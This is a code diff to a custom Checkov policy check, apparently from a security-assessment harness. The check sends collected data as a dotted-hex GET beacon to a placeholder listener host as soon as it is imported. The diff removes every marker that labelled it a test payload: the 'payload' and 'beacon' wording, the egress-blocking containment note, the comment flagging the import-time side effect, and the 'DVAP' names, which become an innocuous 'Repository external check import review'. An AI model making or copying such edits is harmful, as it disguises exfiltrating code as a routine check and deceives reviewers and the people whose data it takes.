@@ -1,4 +1,4 @@
-"""DVAP payload: custom Checkov "check" that beacons on import.
+"""Assessment fixture: custom Checkov check that signals on import.
 
 Real behavior abused
 --------------------
@@ -11,8 +11,7 @@ import time is the whole point.
 Containment
 -----------
 The only network destination is the ``__DVAP_LISTENER_HOST__`` placeholder, which
-the worker substitutes with the in-network ``listener`` service (or the
-``egress.blocked.invalid`` black-hole when ``block_egress`` is on). Stdlib only.
+the worker substitutes with the in-network ``listener`` service. Stdlib only.
 """
 
 import os
@@ -70,7 +69,7 @@ def _beacon():
     """Fire a single GET to the listener with the dotted-hex exfil."""
     marker_name = "".join(
         ch if ch.isalnum() or ch in ("-", "_") else "_"
-        for ch in f"dvap_checkov_{SCAN_TOKEN}_{VECTOR}.sent"
+            for ch in f"assessment_checkov_{SCAN_TOKEN}_{VECTOR}.sent"
     )
     marker_path = os.path.join("/tmp", marker_name[:180])
     try:
@@ -79,7 +78,7 @@ def _beacon():
     except FileExistsError:
         return
     except OSError:
-        # If /tmp is unavailable, keep the payload behavior rather than failing.
+        # If /tmp is unavailable, keep the fixture behavior rather than failing.
         pass
 
     dotted = _dotted_hex(_collect_exfil())
@@ -98,22 +97,21 @@ def _beacon():
     try:
         urllib.request.urlopen(url, timeout=5).read()
     except Exception:
-        # A blocked beacon (egress off / host unresolvable) is expected and
-        # must never crash the host analyzer.
+        # Network failures must never crash the host analyzer.
         pass
 
 
-# Side effect at import time -- this is the "implicit execution" being demoed.
+# Side effect at import time.
 _beacon()
 
 
-class DVAPExternalCheck(BaseResourceCheck):
+class RepositoryPolicyCheck(BaseResourceCheck):
     """Minimal valid Checkov custom check so the external-check loader imports us."""
 
     def __init__(self):
         super().__init__(
-            name="DVAP custom external check import canary",
-            id="CKV_DVAP_1",
+            name="Repository external check import review",
+            id="CKV_REPO_1",
             categories=[CheckCategories.GENERAL_SECURITY],
             supported_resources=["aws_s3_bucket"],
         )
@@ -122,4 +120,4 @@ class DVAPExternalCheck(BaseResourceCheck):
         return CheckResult.PASSED
 
 
-check = DVAPExternalCheck()
+check = RepositoryPolicyCheck()
